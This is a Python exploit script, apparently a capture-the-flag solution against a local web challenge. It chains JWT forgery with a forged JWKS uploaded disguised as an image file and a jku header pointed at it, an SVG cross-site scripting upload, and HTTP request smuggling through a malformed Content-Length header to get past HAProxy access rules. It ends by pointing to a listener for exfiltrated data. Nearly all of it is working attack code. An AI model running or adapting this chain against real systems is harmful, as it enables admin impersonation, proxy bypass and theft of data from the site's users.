import base64
import json
import os
import socket
import time

from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes
import jwt
import requests

HOST = "localhost"
PORT = 1337
URL = f"http://{HOST}:{PORT}"

# only need to generate these once and then can reuse
if not os.path.exists("priv.pem"):
    key = RSA.generate(2048)
    with open("priv.pem", "wb") as priv:
        priv.write(key.export_key("PEM"))
    with open("pub.pem", "wb") as pub:
        pub.write(key.public_key().export_key("PEM")) 
    print(f"[+] RSA keys generated")

with open("priv.pem", "rb") as priv:
    private_key_txt = priv.read()

# extract e and N values from private key to be used in forged JWKS
private_key = RSA.import_key(private_key_txt)
e = base64.b64encode(long_to_bytes(private_key.e)).decode()
n = base64.b64encode(long_to_bytes(private_key.n)).decode()


# register user and login to retrieve JWT
session = requests.session()
user_data = {"username": "user", "password": "user"}
session.post(URL + "/api/register", json=user_data)
res = session.post(URL + "/api/login", json=user_data)
print(f"[+] User registered and logged in")


# get JWKS from server and update with values from generated key before writing to file
res = session.get(URL + "/.well-known/jwks.json")
forged_jwks = res.json()
forged_jwks["keys"][0]["e"] = e
forged_jwks["keys"][0]["n"] = n

with open("jwks.jpg", "w") as outfile:
    outfile.write(json.dumps(forged_jwks))

print(f"[+] Forged JWKS written to jwks.jpg")
input()


# upload forged JWKS and get storage URL
res = session.post(URL + "/api/upload", files={"verificationDoc": open("jwks.jpg", "rb")})
jwks_path = "/uploads/" + res.json()["filename"]
print(f"[+] Forged JWKS uploaded to {jwks_path}")
input()


# construct forged admin JWT pointing JKU to forged JWKS on server
token = session.cookies["session"]

forged_header = jwt.get_unverified_header(token)
forged_header["jku"] = "http://localhost:1337" + jwks_path

forged_data = jwt.decode(token, options={"verify_signature": False})
forged_data["username"] = "admin"

forged_token = jwt.encode(forged_data, private_key_txt, algorithm="RS256", headers=forged_header)
print(f"[+] Forged admin token created {forged_token}")
input()


# register XSS payload user, login, and upload file
session = requests.session()
user_data = {"username": "xss_payload", "password": "xss_payload"}
session.post(URL + "/api/register", json=user_data)
res = session.post(URL + "/api/login", json=user_data)
print(f"[+] XXS payload user registered and logged in")


# upload SVG with XSS payload and get storage URL (for later admin XSS after request smuggling)
res = session.post(URL + "/api/upload", files={"verificationDoc": open("payload.svg", "rb")})
xss_path = "/uploads/" + res.json()["filename"]
print(f"[+] SVG XSS payload uploaded to {xss_path}")
input()


# use HTTP request smuggling to bypass HAproxy ACL rules and reach restricted backend route
request = """POST / HTTP/1.1
Host: localhost:1337
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: {length}

{smuggled}
"""

smuggled = """POST /api/test-ui HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Cookie: session={token}
Content-Length: {length}

{data}

"""


# construct request to smuggle past HAProxy and trigger XSS through /api/test-ui endpoint
data = json.dumps({"path": xss_path, "keyword": "A"})
smuggled = smuggled.format(token=forged_token, length=len(data), data=data)

request = request.format(length=len(smuggled), smuggled=smuggled)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

sock.send(request.encode())
print(f"[+] Sent requests\n{request}")
time.sleep(2)

sock.close()
print(f"[+] Check listener for exfiltrated data")
